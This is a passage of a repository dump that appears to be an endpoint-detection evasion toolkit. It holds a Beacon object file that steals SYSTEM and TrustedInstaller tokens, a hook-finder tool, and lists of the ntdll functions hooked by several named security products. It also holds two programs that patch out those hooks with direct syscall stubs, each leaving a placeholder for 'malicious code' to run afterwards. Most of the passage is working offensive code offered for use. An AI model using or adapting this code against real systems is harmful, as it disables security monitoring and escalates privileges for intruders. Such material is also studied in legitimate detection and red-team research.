          "content": "#include <windows.h>\n#include <stdio.h>\n#include <TlHelp32.h>\n#include \"beacon.h\"\n\n#define DEBUG FALSE\n\n#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }\n\nDECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);\nDECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);\n\n\nFARPROC Resolver(CHAR *lib, CHAR *func);\nDWORD GetProcByPID(CHAR *name);\nDWORD GetTrustedInstallerPID();\nBOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage);\nBOOL ElevateSystem(HANDLE *);\nBOOL ElevateTrustedInstaller(HANDLE *);\n\nFARPROC Resolver(CHAR *lib, CHAR *func) {\n    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);\n    if(DEBUG) {\n\t    printf(\"[%s] %s!%s at 0x%p\\n\", __func__, lib, func, ptr);\n    }\n\treturn ptr;\n}\n\nDWORD GetProcByPID(CHAR *name) {\n    FARPROC CreateToolhelp32Snapshot = Resolver(\"kernel32.dll\", \"CreateToolhelp32Snapshot\");\n    FARPROC Process32First = Resolver(\"kernel32.dll\", \"Process32First\");\n    FARPROC Process32Next = Resolver(\"kernel32.dll\", \"Process32Next\");\n    FARPROC CloseHandle = Resolver(\"kernel32.dll\", \"CloseHandle\");\n    FARPROC strcmp = Resolver(\"msvcrt.dll\", \"strcmp\");\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    DWORD PID = 0;\n    PROCESSENTRY32 pe32;\n    pe32.dwSize = sizeof(PROCESSENTRY32);\n\n    if(Process32First(hSnap, &pe32)) {\n        do {\n        if(strcmp(pe32.szExeFile, name) == 0) {\n            PID = pe32.th32ProcessID;\n            printf(\"[%s] Process %s PID is %d\\n\", __func__, name, PID);\n            break;\n        }\n        } while(Process32Next(hSnap, &pe32));\n    }\n\n    CloseHandle(hSnap);\n    return PID;\n}\n\nDWORD GetTrustedInstallerPID() {\n    FARPROC OpenSCManager = Resolver(\"advapi32.dll\", \"OpenSCManagerA\");\n    FARPROC OpenService = Resolver(\"advapi32.dll\", \"OpenServiceA\");\n    FARPROC QueryServiceStatusEx = Resolver(\"advapi32.dll\", \"QueryServiceStatusEx\");\n    FARPROC StartService = Resolver(\"advapi32.dll\", \"StartServiceA\");\n    FARPROC GetLastError = Resolver(\"kernel32.dll\", \"GetLastError\");\n    FARPROC CloseHandle = Resolver(\"kernel32.dll\", \"CloseHandle\");\n    FARPROC SleepEx = Resolver(\"kernel32.dll\", \"SleepEx\");\n\n    DWORD PID = 0;\n    SC_HANDLE schManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);\n\n    if(schManager == NULL) {\n        printf(\"[%s] OpenSCManager failed. Error: %d\\n\", __func__, GetLastError());\n        return FALSE;\n    }\n\n    SC_HANDLE schService = OpenService(schManager, \"TrustedInstaller\", SERVICE_QUERY_STATUS | SERVICE_START);\n\n     if(schManager == NULL) {\n        printf(\"[%s] OpenService failed. Error: %d\\n\", __func__, GetLastError());\n        CloseHandle(schManager);\n        return FALSE;\n    }  \n    CloseHandle(schManager);\n\n    SERVICE_STATUS_PROCESS ssp;\n    DWORD dwSize = 0;\n\n    while(QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {\n        printf(\"[%s] QueryServiceStatusEx need %d bytes.\\n\", __func__, dwSize);\n        if(ssp.dwCurrentState == SERVICE_STOPPED) {\n            if(!StartService(schService, 0, NULL)) {\n                printf(\"[%s] StartService failed. Error: %d\\n\", __func__, GetLastError());\n                CloseHandle(schService);\n                return FALSE; \n            }\n        }\n        if(ssp.dwCurrentState == SERVICE_RUNNING) {\n            PID = ssp.dwProcessId;\n            printf(\"[%s] TrustedInstaller Service PID is %d\\n\", __func__, PID);\n            break;\n        }\n        SleepEx(5000, FALSE);\n    }\n\n    CloseHandle(schService); \n    return PID;\n}\n\nBOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage) {\n    FARPROC OpenProcess = Resolver(\"kernel32.dll\", \"OpenProcess\");\n    FARPROC OpenProcessToken = Resolver(\"kernel32.dll\", \"OpenProcessToken\");\n    FARPROC DuplicateTokenEx = Resolver(\"advapi32.dll\", \"DuplicateTokenEx\");\n    FARPROC ImpersonateLoggedOnUser = Resolver(\"advapi32.dll\", \"ImpersonateLoggedOnUser\");\n    FARPROC GetLastError = Resolver(\"kernel32.dll\", \"GetLastError\");\n    FARPROC CloseHandle = Resolver(\"kernel32.dll\", \"CloseHandle\");\n\n    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);\n\n    if(hProc == NULL) {\n        printf(\"[%s] OpenProcess on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        return FALSE;\n    }\n\n    HANDLE hToken = NULL;\n    if(!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {\n        printf(\"[%s] OpenProcessToken on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        CloseHandle(hProc);\n        return FALSE;\n    }\n    CloseHandle(hProc);\n    \n    HANDLE hDup = NULL;\n    SECURITY_ATTRIBUTES sa;\n    sa.nLength = sizeof(SECURITY_ATTRIBUTES);\n    sa.lpSecurityDescriptor = NULL;\n    sa.bInheritHandle = FALSE;\n\n    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {\n        printf(\"[%s] DuplicateTokenEx on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        CloseHandle(hToken);\n        return FALSE;       \n    }\n    CloseHandle(hToken);\n\n    if(!ImpersonateLoggedOnUser(hDup)) {\n        printf(\"[%s] ImpersonateLoggedOnUser on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        CloseHandle(hDup);\n        return FALSE;            \n    }\n\n    *hStorage = hDup;\n\n    return TRUE;\n}\n\nBOOL ElevateSystem(HANDLE *hTokenSystem) {\n    DWORD PID = GetProcByPID(\"winlogon.exe\");\n    if(PID != 0) {\n        if(ImpersonateByPID(PID, hTokenSystem)) {\n            printf(\"[%s] ImpersonateByPID(SYSTEM) succeeded.\\n\", __func__);\n        }\n    }\n}\n\nBOOL ElevateTrustedInstaller(HANDLE *hTokenTrustedInstaller) {\n    DWORD PID = GetTrustedInstallerPID();\n    if(PID != 0) {\n        if(ImpersonateByPID(PID, hTokenTrustedInstaller)) {\n            printf(\"[%s] ImpersonateByPID(TrustedInstaller) succeeded.\\n\", __func__);\n        }\n    }\n}\n\nint go() {\n    HANDLE hTokenSystem = NULL;\n    HANDLE hTokenTrustedInstaller = NULL;\n\n    FARPROC SetThreadToken = Resolver(\"kernel32.dll\", \"SetThreadToken\");\n    FARPROC GetLastError = Resolver(\"kernel32.dll\", \"GetLastError\");\n    \n    ElevateSystem(&hTokenSystem);\n    ElevateTrustedInstaller(&hTokenTrustedInstaller);\n\n    printf(\"[%s] (SYSTEM) Token HANDLE 0x%p.\\n\", __func__, hTokenSystem);\n    printf(\"[%s] (TrustedInstaller) Token HANDLE 0x%p.\\n\", __func__, hTokenTrustedInstaller);\n    \n    if(!SetThreadToken(NULL, hTokenSystem)) {\n        printf(\"[%s] (SYSTEM) SetThreadToken failed. Error: %d.\\n\", __func__, GetLastError());       \n    }\n    \n    if(hTokenTrustedInstaller != NULL) {\n        if(!SetThreadToken(NULL, hTokenTrustedInstaller)) {\n            printf(\"[%s] (TrustedInstaller) SetThreadToken failed. Error: %d.\\n\", __func__, GetLastError());       \n        }\n    }\n\n    return 0;\n}\n"
        },
        {
          "name": "eset.txt",
          "type": "blob",
          "size": 1.8759765625,
          "content": "Loading C:\\windows\\system32\\ntdll.dll\nHookFinder Mr.Un1k0d3r RingZer0 Team\nC:\\EDRs-main\\hook_finder64.exe is loaded at 0x0000000000400000.\nC:\\Windows\\SYSTEM32\\ntdll.dll is loaded at 0x00007FFDB1AB0000.\nC:\\Windows\\System32\\KERNEL32.DLL is loaded at 0x00007FFDB03F0000.\nC:\\Windows\\System32\\KERNELBASE.dll is loaded at 0x00007FFDAF320000.\nC:\\Windows\\System32\\msvcrt.dll is loaded at 0x00007FFDB08C0000.\nC:\\Program Files\\ESET\\ESET Security\\ebehmoni.dll is loaded at 0x00007FFD99910000.\n------------------------------------------\nBASE            0x00007FFDB1AB0000    MZÂ\nPE            0x00007FFDB1AB00E8    PE\nExportTableOffset    0x00007FFDB1C01170\nOffsetNameTable        0x00007FFDB1C03790\nFunctions Count        0x97e (2430)\n------------------------------------------\nNtAllocateVirtualMemory is hooked\nNtAllocateVirtualMemoryEx is hooked\nNtCreateEvent is hooked\nNtCreateMutant is hooked\nNtCreateSemaphore is hooked\nNtCreateThread is hooked\nNtCreateThreadEx is hooked\nNtDeviceIoControlFile is hooked\nNtMapViewOfSection is hooked\nNtMapViewOfSectionEx is hooked\nNtProtectVirtualMemory is hooked\nNtQueueApcThread is hooked\nNtReleaseWorkerFactoryWorker is hooked\nNtSetContextThread is hooked\nNtSuspendThread is hooked\nNtTerminateThread is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\nRtlDecompressBuffer is hooked\nZwAllocateVirtualMemory is hooked\nZwAllocateVirtualMemoryEx is hooked\nZwCreateEvent is hooked\nZwCreateMutant is hooked\nZwCreateSemaphore is hooked\nZwCreateThread is hooked\nZwCreateThreadEx is hooked\nZwDeviceIoControlFile is hooked\nZwMapViewOfSection is hooked\nZwMapViewOfSectionEx is hooked\nZwProtectVirtualMemory is hooked\nZwQueueApcThread is hooked\nZwReleaseWorkerFactoryWorker is hooked\nZwSetContextThread is hooked\nZwSuspendThread is hooked\nZwTerminateThread is hooked\nZwUnmapViewOfSection is hooked\nZwWriteVirtualMemory is hooked\n------------------------------------------\nCompleted\n"
        },
        {
          "name": "get_syscall64.c",
          "type": "blob",
          "size": 0.3447265625,
          "content": "#include <Windows.h>\n#include <stdio.h>\n\nint main(int argc, char **argv) {\n    HANDLE hLib = LoadLibraryA(argv[1]);\n    CHAR *ptr = (CHAR*)GetProcAddress(hLib, argv[2]);\n    DWORD syscall = 0;\n    printf(\"%s!%s at 0x%p\\n\", argv[1], argv[2], ptr);\n    printf(\"%s syscall ID 0x%08x (%d)\\n\", argv[2], (DWORD)*(ptr + 4), (DWORD)*(ptr + 4));\n    return 0;\n}\n"
        },
        {
          "name": "hook_finder64.c",
          "type": "blob",
          "size": 2.1240234375,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <tlhelp32.h>\n#include <winnt.h>\n\nVOID DumpListOfExport(VOID *lib, BOOL bNt);\nVOID CheckJmp(CHAR *name, DWORD* address, BOOL bNt);\nVOID ListLoadedDlls();\n\nVOID ListLoadedDlls() {\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);\n    MODULEENTRY32 me32;\n    me32.dwSize = sizeof(MODULEENTRY32);\n\n    printf(\"Listing loaded modules\\n------------------------------------------\\n\");\n    if(Module32First(hSnap, &me32)) {\n        do {\n            printf(\"%s is loaded at 0x%p.\\n\", me32.szExePath, me32.modBaseAddr);\n\n        } while(Module32Next(hSnap, &me32));\n    }\n\n    CloseHandle(hSnap);\n}\n\nVOID DumpListOfExport(VOID *lib, BOOL bNt) {\n\n    IMAGE_DOS_HEADER* MZ = (IMAGE_DOS_HEADER*)lib;\n    IMAGE_NT_HEADERS* PE = (IMAGE_NT_HEADERS*)((BYTE*)lib + MZ->e_lfanew);\n    IMAGE_EXPORT_DIRECTORY* export = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)lib + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    \n    DWORD *name = (DWORD*)((BYTE*)lib + export->AddressOfNames);\n\n    DWORD i = 0;\n    for(i; i < export->NumberOfNames; i++) \n\n{\n\n\n        CheckJmp((CHAR*)lib + name[i], (DWORD*)GetProcAddress(lib, lib + name[i]), bNt);\n    }    \n}\n\nVOID CheckJmp(CHAR *name, DWORD* address, BOOL bNt) {\n    BYTE* opcode = (BYTE*)address;\n\n    // Some EDRs hook more than Nt* API. Ex: LdrLoadDll \n    if(bNt) {\n        if(!(name[0] == 'N' && name[1] == 't')) {\n            return;\n        }\n    }\n\n    // not all EDRs hook the first byte you will miss some hook\n    if(*opcode == 0xe9) {\n        printf(\"%s is hooked\\n\", name);\n    }\n}\n\nint main (int argc, char **argv) {\n    CHAR *dll = argv[1];\n    HANDLE hDll = LoadLibrary(dll);\n    BOOL bNt = TRUE;\n\t\n    printf(\"Loading %s\\nHookFinder Mr.Un1k0d3r RingZer0 Team\\n\", dll);\n    if(hDll == NULL) {\n        ExitProcess(0);\n    }\n\n    ListLoadedDlls();\n    \n    if(argc > 2) {\n        bNt = FALSE;\n    } else {\n        printf(\"***Listing Nt* API only\\n\\n\");\n    }\n    \n    DumpListOfExport(hDll, bNt);\n    CloseHandle(hDll);\n    printf(\"------------------------------------------\\nCompleted\\n\");\n    return 0;\n}\n"
        },
        {
          "name": "hook_finder64.exe",
          "type": "blob",
          "size": 55.8623046875,
          "content": null
        },
        {
          "name": "kernel-callback.png",
          "type": "blob",
          "size": 54.2392578125,
          "content": null
        },
        {
          "name": "listdll.exe",
          "type": "blob",
          "size": 54.0712890625,
          "content": null
        },
        {
          "name": "listdlls.c",
          "type": "blob",
          "size": 0.5986328125,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <tlhelp32.h>\n\nVOID ListLoadedDlls() {\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);\n    MODULEENTRY32 me32;\n    me32.dwSize = sizeof(MODULEENTRY32);\n\n    printf(\"Listing loaded modules inside process PID %d\\n------------------------------------------\\n\", GetCurrentProcessId());\n    if(Module32First(hSnap, &me32)) {\n        do {\n            printf(\"%s is loaded at 0x%p.\\n\", me32.szExePath, me32.modBaseAddr);\n\n        } while(Module32Next(hSnap, &me32));\n    }\n\n    CloseHandle(hSnap);\n}\n\nint main() {\n    ListLoadedDlls();\n    return 0;\n}\n"
        },
        {
          "name": "mcafee.txt",
          "type": "blob",
          "size": 0.5537109375,
          "content": "LdrLoadDll is hooked\nNtAlertResumeThread is hooked\nNtCreateThreadEx is hooked\nNtGetContextThread is hooked\nNtMapViewOfSection is hooked\nNtQueueApcThread is hooked\nNtResumeThread is hooked\nNtSetContextThread is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\nRtlCreateUserThread is hooked\nZwAlertResumeThread is hooked\nZwCreateThreadEx is hooked\nZwGetContextThread is hooked\nZwMapViewOfSection is hooked\nZwQueueApcThread is hooked\nZwResumeThread is hooked\nZwSetContextThread is hooked\nZwUnmapViewOfSection is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "patch_syscall64.c",
          "type": "blob",
          "size": 3.2265625,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nVOID PatchHook(CHAR* address, unsigned char id, char high);\n\nVOID CleanUp() {\n    HANDLE hDll = LoadLibrary(\"ntdll.dll\");\n    FARPROC NtAllocateVirtualMemory = GetProcAddress(hDll, \"NtAllocateVirtualMemory\");\n    FARPROC NtAllocateVirtualMemoryEx = GetProcAddress(hDll, \"NtAllocateVirtualMemoryEx\");\n    FARPROC NtDeviceIoControlFile = GetProcAddress(hDll, \"NtDeviceIoControlFile\");\n    FARPROC NtGetContextThread = GetProcAddress(hDll, \"NtGetContextThread\");\n    FARPROC NtMapViewOfSection = GetProcAddress(hDll, \"NtMapViewOfSection\");\n    FARPROC NtMapViewOfSectionEx = GetProcAddress(hDll, \"NtMapViewOfSectionEx\");\n    FARPROC NtProtectVirtualMemory = GetProcAddress(hDll, \"NtProtectVirtualMemory\");\n    FARPROC NtQueryInformationThread = GetProcAddress(hDll, \"NtQueryInformationThread\");\n    FARPROC NtQueueApcThread = GetProcAddress(hDll, \"NtQueueApcThread\");\n    FARPROC NtQueueApcThreadEx = GetProcAddress(hDll, \"NtQueueApcThreadEx\");\n    FARPROC NtReadVirtualMemory = GetProcAddress(hDll, \"NtReadVirtualMemory\");\n    FARPROC NtResumeThread = GetProcAddress(hDll, \"NtResumeThread\");\n    FARPROC NtSetContextThread = GetProcAddress(hDll, \"NtSetContextThread\");\n    FARPROC NtSetInformationProcess = GetProcAddress(hDll, \"NtSetInformationProcess\");\n    FARPROC NtSetInformationThread = GetProcAddress(hDll, \"NtSetInformationThread\");\n    FARPROC NtSuspendThread = GetProcAddress(hDll, \"NtSuspendThread\");\n    FARPROC NtUnmapViewOfSection = GetProcAddress(hDll, \"NtUnmapViewOfSection\");\n    FARPROC NtUnmapViewOfSectionEx = GetProcAddress(hDll, \"NtUnmapViewOfSectionEx\");\n    FARPROC NtWriteVirtualMemory = GetProcAddress(hDll, \"NtWriteVirtualMemory\");\n\n    PatchHook(NtProtectVirtualMemory, 0x50, 0x00);  // unhooking first since we are going to need it to unhook APIs\n    PatchHook(NtAllocateVirtualMemory, 0x18, 0x00);\n    PatchHook(NtAllocateVirtualMemoryEx, 0x76, 0x00);\n    PatchHook(NtDeviceIoControlFile, 0x7, 0x00);\n    PatchHook(NtGetContextThread, 0xf2, 0x00);\n    PatchHook(NtMapViewOfSection, 0x28, 0x00);\n    PatchHook(NtMapViewOfSectionEx, 0x14, 0x01);\n    PatchHook(NtQueryInformationThread, 0x25, 0x00);\n    PatchHook(NtQueueApcThread, 0x45, 0x00);\n    PatchHook(NtQueueApcThreadEx, 0x65, 0x01);\n    PatchHook(NtReadVirtualMemory, 0x3f, 0x00);\n    PatchHook(NtResumeThread, 0x52, 0x00);\n    PatchHook(NtSetContextThread, 0x8b, 0x01);\n    PatchHook(NtSetInformationProcess, 0x1c, 0x00);\n    PatchHook(NtSetInformationThread, 0x0d, 0x00);\n    PatchHook(NtSuspendThread, 0xbc, 0x01);\n    PatchHook(NtUnmapViewOfSection, 0x2a, 0x00);\n    PatchHook(NtUnmapViewOfSectionEx, 0xcc, 0x01);\n    PatchHook(NtWriteVirtualMemory, 0x3a, 0x00);\n    \n    CloseHandle(hDll);\n}\n\nVOID PatchHook(CHAR* address, unsigned char id, char high) {\n    CHAR* patch_address = address + 3;\n    // \\xb8\\xXX\\xHH\\x00\\x00\\x0f\\x05\\xc3\n    unsigned long long patch = 0xc3050f00000000b8;\n    unsigned long long syscall = patch + (id << 8);\n    syscall += high << 16;\n\n    DWORD dwOld;\n    VirtualProtect(patch_address, sizeof(unsigned long long), PAGE_EXECUTE_READWRITE, &dwOld);\n    memcpy(patch_address, &syscall, sizeof(unsigned long long));\n}\n\nint main (int argc, char **argv) {\n    CleanUp();\n\n    // Malicious Code\n\n    return 0;\n}\n"
        },
        {
          "name": "patch_syscall_dynamically64.c",
          "type": "blob",
          "size": 3.2705078125,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nVOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap);\nVOID PatchHook(CHAR* address, unsigned char id, char high);\nVOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll);\n\nVOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap) {\n        VOID *data = NULL;\n        HANDLE localHFile = *hFile;\n        HANDLE localHMap = *hMap;\n        localHFile = CreateFile(name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n        localHMap = CreateFileMapping(localHFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n        data = MapViewOfFile(localHMap, FILE_MAP_READ, 0, 0, 0);\n\n        hFile = &localHFile;\n        hMap = &localHMap;\n\n        return data;\n}\n\nVOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll) {\n    DWORD dwIter = 0;\n    CHAR* base = lib;\n    CHAR* PE = base + (unsigned char)*(base + 0x3c);\n    DWORD ExportDirectoryOffset = *((DWORD*)PE + (0x8a / 4));\n    CHAR* ExportDirectory = base + ExportDirectoryOffset;\n    DWORD dwFunctionsCount = *((DWORD*)ExportDirectory + (0x14 / 4));\n    DWORD OffsetNamesTableOffset = *((DWORD*)ExportDirectory + (0x20 / 4));\n    DWORD* OffsetNamesTable = base + OffsetNamesTableOffset;\n    DWORD OffsetOrdinals = *((DWORD*)ExportDirectory + (0x24 / 4));\n    WORD* ordinals = base + OffsetOrdinals;\n    DWORD OffsetFunctions = *((DWORD*)ExportDirectory + (0x1c / 4));\n    DWORD* functions = base + OffsetFunctions;\n\n    printf(\"------------------------------------------\\nBASE\\t\\t\\t0x%p\\t%s\\nPE\\t\\t\\t0x%p\\t%s\\nExportTableOffset\\t0x%p\\nOffsetNameTable\\t\\t0x%p\\nOrdinalTable\\t\\t0x%p\\nFunctionTable\\t\\t0x%p\\nFunctions Count\\t\\t0x%x (%d)\\n------------------------------------------\\n\",\n    base, base, PE, PE, ExportDirectory, OffsetNamesTable, ordinals, functions, dwFunctionsCount, dwFunctionsCount);\n\n    for(dwIter; dwIter < dwFunctionsCount - 1; dwIter++) {\n        DWORD64 offset = *(OffsetNamesTable + dwIter);\n        CHAR* current = base + offset;\n        if(strcmp(current, name) == 0) {\n            WORD offsetInOrdinal = *(ordinals + dwIter);\n            DWORD function = *(functions + offsetInOrdinal);\n            CHAR *func = base + function + 4;\n            DWORD *data = (DWORD*)func;\n            DWORD syscallID = *data;\n            CHAR id = syscallID;\n            CHAR high = syscallID >> 8;\n            FARPROC toPatchAddr = GetProcAddress(hDll, name);\n\n            PatchHook(toPatchAddr, id, high);\n            break;\n        }\n    }\n}\n\nVOID PatchHook(CHAR* address, unsigned char id, char high) {\n    DWORD dwSize = 11;\n    CHAR* patch_address = address;\n    //\\x4c\\x8b\\xd1\\xb8\\xXX\\xHH\\x00\\x00\\x0f\\x05\\xc3\n    CHAR* patch[dwSize];\n    sprintf(patch, \"\\x4c\\x8b\\xd1\\xb8%c%c%c%c\\x0f\\x05\\xc3\", id, high, high ^ high, high ^ high);\n\n    DWORD dwOld;\n    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);\n    memcpy(patch_address, patch, dwSize);\n}\n\nint main (int argc, char **argv) {\n    CHAR *dll = argv[1];\n    HANDLE hFile = NULL;\n    HANDLE hMap = NULL;\n    printf(\"Opening %s\\n\", dll);\n\n    HANDLE hDll = LoadLibrary(dll);\n\n    VOID *data = GetFileFromDisk(dll, &hFile, &hMap);\n    PatchAPI(data, \"NtOpenProcess\", hDll);\n\n    CloseHandle(hFile);\n    CloseHandle(hMap);\n\n    // malicious code goes here\n\n    return 0;\n}\n"
        },
        {
          "name": "sentinelone.txt",
          "type": "blob",
          "size": 1.365234375,
          "content": "KiUserApcDispatcher is hooked\nLdrLoadDll is hooked\nNtAllocateVirtualMemory is hooked\nNtCreateThreadEx is hooked\nNtCreateUserProcess is hooked\nNtFreeVirtualMemory is hooked\nNtLoadDriver is hooked\nNtMapUserPhysicalPages is hooked\nNtMapViewOfSection is hooked\nNtOpenProcess is hooked\nNtProtectVirtualMemory is hooked\nNtQuerySystemInformation is hooked\nNtQuerySystemInformationEx is hooked\nNtQueueApcThread is hooked\nNtQueueApcThreadEx is hooked\nNtReadVirtualMemory is hooked\nNtResumeThread is hooked\nNtSetContextThread is hooked\nNtSetInformationProcess is hooked\nNtSetInformationThread is hooked\nNtTerminateProcess is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\nRtlAddVectoredExceptionHandler is hooked\nRtlGetNativeSystemInformation is hooked\nZwAllocateVirtualMemory is hooked\nZwCreateThreadEx is hooked\nZwCreateUserProcess is hooked\nZwFreeVirtualMemory is hooked\nZwLoadDriver is hooked\nZwMapUserPhysicalPages is hooked\nZwMapViewOfSection is hooked\nZwOpenProcess is hooked\nZwProtectVirtualMemory is hooked\nZwQuerySystemInformation is hooked\nZwQuerySystemInformationEx is hooked\nZwQueueApcThread is hooked\nZwQueueApcThreadEx is hooked\nZwReadVirtualMemory is hooked\nZwResumeThread is hooked\nZwSetContextThread is hooked\nZwSetInformationProcess is hooked\nZwSetInformationThread is hooked\nZwTerminateProcess is hooked\nZwUnmapViewOfSection is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "sophos.txt",
          "type": "blob",
          "size": 0.6806640625,
          "content": "KiUserApcDispatcher is hooked\nLdrLoadDll is hooked\nNtAllocateVirtualMemory is hooked\nNtAlpcConnectPort is hooked\nNtFreeVirtualMemory is hooked\nNtMapViewOfSection is hooked\nNtProtectVirtualMemory is hooked\nNtQueueApcThread is hooked\nNtReadVirtualMemory is hooked\nNtSetContextThread is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\nRtlInstallFunctionTableCallback is hooked\nZwAllocateVirtualMemory is hooked\nZwAlpcConnectPort is hooked\nZwFreeVirtualMemory is hooked\nZwMapViewOfSection is hooked\nZwProtectVirtualMemory is hooked\nZwQueueApcThread is hooked\nZwReadVirtualMemory is hooked\nZwSetContextThread is hooked\nZwUnmapViewOfSection is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "symantec.txt",
          "type": "blob",
          "size": 0.728515625,
          "content": "NtCreateFile is hooked\nNtCreateKey is hooked\nNtCreateUserProcess is hooked\nNtDeleteFile is hooked\nNtDeleteKey is hooked\nNtDeleteValueKey is hooked\nNtMapViewOfSection is hooked\nNtOpenFile is hooked\nNtOpenKey is hooked\nNtOpenKeyEx is hooked\nNtRenameKey is hooked\nNtSetInformationFile is hooked\nNtSetValueKey is hooked\nNtTerminateProcess is hooked\nNtTerminateThread is hooked\nZwCreateFile is hooked\nZwCreateKey is hooked\nZwCreateUserProcess is hooked\nZwDeleteFile is hooked\nZwDeleteKey is hooked\nZwDeleteValueKey is hooked\nZwMapViewOfSection is hooked\nZwOpenFile is hooked\nZwOpenKey is hooked\nZwOpenKeyEx is hooked\nZwRenameKey is hooked\nZwSetInformationFile is hooked\nZwSetValueKey is hooked\nZwTerminateProcess is hooked\nZwTerminateThread is hooked\n"
        },
        {
          "name": "trend.txt",
          "type": "blob",
          "size": 2.2734375,
          "content": "Loading C:\\Windows\\System32\\ntdll.dll\r\nHookFinder Mr.Un1k0d3r RingZer0 Team\r\nC:\\Users\\trend\\Desktop\\hook_finder64.exe is loaded at 0x0000000000400000.\r\nC:\\Windows\\SYSTEM32\\ntdll.dll is loaded at 0x00007FF927870000.\r\nC:\\Windows\\System32\\KERNEL32.DLL is loaded at 0x00007FF926400000.\r\nC:\\Windows\\System32\\KERNELBASE.dll is loaded at 0x00007FF925590000.\r\nC:\\Windows\\System32\\msvcrt.dll is loaded at 0x00007FF925A70000.\r\nC:\\Windows\\system32\\tmumh\\20019\\AddOn\\8.55.0.1074\\TmUmEvt64.dll is loaded at 0x00007FF91C5C0000.\r\nC:\\Windows\\System32\\PSAPI.DLL is loaded at 0x00007FF926F30000.\r\nC:\\Windows\\System32\\ADVAPI32.dll is loaded at 0x00007FF926130000.\r\nC:\\Windows\\System32\\sechost.dll is loaded at 0x00007FF925B10000.\r\nC:\\Windows\\System32\\RPCRT4.dll is loaded at 0x00007FF9261E0000.\r\nC:\\Windows\\system32\\tmumh\\20019\\TmMon\\2.9.0.1020\\tmmon64.dll is loaded at 0x000000006E0F0000.\r\nC:\\Windows\\System32\\SHLWAPI.dll is loaded at 0x00007FF926F40000.\r\n------------------------------------------\r\nBASE\t\t\t0x00007FF927870000\tMZÂ\r\nPE\t\t\t0x00007FF9278700E8\tPE\r\nExportTableOffset\t0x00007FF9279C1180\r\nOffsetNameTable\t\t0x00007FF9279C37A4\r\nFunctions Count\t\t0x97f (2431)\r\n------------------------------------------\r\nLdrLoadDll is hooked\r\nLdrUnloadDll is hooked\r\nNtCreateMutant is hooked\r\nNtCreateThread is hooked\r\nNtCreateThreadEx is hooked\r\nNtDeviceIoControlFile is hooked\r\nNtGetContextThread is hooked\r\nNtLoadDriver is hooked\r\nNtMapViewOfSection is hooked\r\nNtProtectVirtualMemory is hooked\r\nNtQueryInformationThread is hooked\r\nNtQueueApcThread is hooked\r\nNtReadVirtualMemory is hooked\r\nNtSetContextThread is hooked\r\nNtSetInformationThread is hooked\r\nNtTerminateProcess is hooked\r\nNtUnmapViewOfSection is hooked\r\nNtUnmapViewOfSectionEx is hooked\r\nNtWriteVirtualMemory is hooked\r\nZwCreateMutant is hooked\r\nZwCreateThread is hooked\r\nZwCreateThreadEx is hooked\r\nZwDeviceIoControlFile is hooked\r\nZwGetContextThread is hooked\r\nZwLoadDriver is hooked\r\nZwMapViewOfSection is hooked\r\nZwProtectVirtualMemory is hooked\r\nZwQueryInformationThread is hooked\r\nZwQueueApcThread is hooked\r\nZwReadVirtualMemory is hooked\r\nZwSetContextThread is hooked\r\nZwSetInformationThread is hooked\r\nZwTerminateProcess is hooked\r\nZwUnmapViewOfSection is hooked\r\nZwUnmapViewOfSectionEx is hooked\r\nZwWriteVirtualMemory is hooked\r\n------------------------------------------\r\nCompleted\r\n"
        },
        {
          "name": "unhookIAT.c",
          "type": "blob",
          "size": 3.9833984375,
